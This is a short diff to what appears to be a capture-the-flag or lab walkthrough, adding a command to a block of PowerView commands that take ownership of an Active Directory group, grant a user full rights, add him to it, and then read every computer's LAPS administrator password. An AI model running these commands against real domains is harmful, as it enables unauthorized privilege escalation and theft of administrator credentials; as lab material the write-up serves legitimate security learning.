@@ -158,6 +158,7 @@ Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
 Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
 Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
 net group 'CORE STAFF'
+Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
 ```
 
 ![image](https://user-images.githubusercontent.com/33616880/231689882-e7a2ef35-a3d0-4aa9-8f7f-2aa99b63203c.png)
